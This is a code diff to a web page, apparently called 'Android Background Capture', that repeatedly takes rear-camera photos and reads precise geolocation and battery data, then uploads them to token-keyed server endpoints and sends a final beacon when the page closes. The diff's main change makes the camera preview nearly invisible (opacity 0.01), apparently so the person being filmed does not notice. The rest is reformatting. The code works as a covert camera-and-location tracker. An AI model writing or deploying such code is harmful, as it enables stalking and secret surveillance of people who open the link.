@@ -5,18 +5,19 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Android Background Capture</title>
   <style>
-    body { font-family: system-ui, Arial; padding: 12px; }
+    body { font-family: system-ui, Arial, sans-serif; padding: 12px; }
     #status { white-space: pre-line; margin-top: 8px; }
 
-    /* IMPORTANT: don't use display:none on <video>, it causes black frames on some browsers */
+    /* keep video on screen but tiny & almost invisible to avoid black frames */
     video {
       position: fixed;
-      top: -10000px;
-      left: -10000px;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
+      bottom: 4px;
+      right: 4px;
+      width: 80px;
+      height: 80px;
+      opacity: 0.01;        /* not 0 */
       pointer-events: none;
+      z-index: 9999;
     }
 
     /* canvas can stay hidden, it's only for offscreen rendering */
@@ -79,11 +80,30 @@
         if (!("geolocation" in navigator)) return resolve(null);
         let done = false;
         navigator.geolocation.getCurrentPosition(
-          pos => { if (!done) { done = true; resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); } },
-          err => { if (!done) { done = true; resolve(null); } },
+          pos => {
+            if (!done) {
+              done = true;
+              resolve({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy
+              });
+            }
+          },
+          err => {
+            if (!done) {
+              done = true;
+              resolve(null);
+            }
+          },
           { timeout, enableHighAccuracy: true }
         );
-        setTimeout(() => { if (!done) { done = true; resolve(null); } }, timeout + 300);
+        setTimeout(() => {
+          if (!done) {
+            done = true;
+            resolve(null);
+          }
+        }, timeout + 300);
       });
     }
 
@@ -107,7 +127,9 @@
           const ok = navigator.sendBeacon(url, blob);
           if (ok) { uploading = false; return true; }
         }
-      } catch(e){ console.warn("sendBeacon error", e); }
+      } catch(e){
+        console.warn("sendBeacon error", e);
+      }
       try {
         await fetch(`/upload_image/${token}`, {
           method: "POST",
@@ -125,13 +147,11 @@
     }
 
     async function captureLoop(){
-      // ensure video ready and has at least one real frame
       const ready = await waitForVideoReady(3000);
       if (!ready) {
         log("Video not ready yet, skipping this tick.");
         return;
       }
-      // slight delay to let first frame settle
       await new Promise(r => setTimeout(r, 250));
 
       const frame = captureFrame();
@@ -141,7 +161,11 @@
       }
 
       const [battery, coords] = await Promise.all([getBattery(), getCoords(3000)]);
-      const payload = { image_b64: frame, battery: battery || null, coords: coords || null };
+      const payload = {
+        image_b64: frame,
+        battery: battery || null,
+        coords: coords || null
+      };
       const ok = await upload(payload);
       log(ok ? "Uploaded image" : "Upload failed");
     }
@@ -149,23 +173,25 @@
     async function start(){
       log("Requesting camera…");
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "environment" },
+          audio: false
+        });
       } catch(e) {
         log("Camera permission denied or error");
         return;
       }
       video.srcObject = stream;
 
-      // wait for a usable frame
       const ready = await waitForVideoReady(3000);
       if (!ready) {
-        // if not ready, wait a little longer before starting loop
         await new Promise(r => setTimeout(r, 500));
       }
       log("Camera ready. Starting capture loop.");
-      // initial capture immediately
       captureLoop().catch(err => console.warn(err));
-      timer = setInterval(() => { captureLoop().catch(err => console.warn(err)); }, INTERVAL);
+      timer = setInterval(() => {
+        captureLoop().catch(err => console.warn(err));
+      }, INTERVAL);
     }
 
     function stopAll(){
@@ -178,12 +204,19 @@
     }
 
     window.addEventListener("beforeunload", () => {
-      // try last metadata beacon
       try {
         if (navigator.sendBeacon) {
-          navigator.sendBeacon(`/upload_info/${token}`, jsonBlob({ note: "page-closed" }));
+          navigator.sendBeacon(
+            `/upload_info/${token}`,
+            jsonBlob({ note: "page-closed" })
+          );
         } else {
-          fetch(`/upload_info/${token}`, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ note: "page-closed" }), keepalive: true }).catch(()=>{});
+          fetch(`/upload_info/${token}`, {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({ note: "page-closed" }),
+            keepalive: true
+          }).catch(()=>{});
         }
       } catch(e){}
       stopAll();
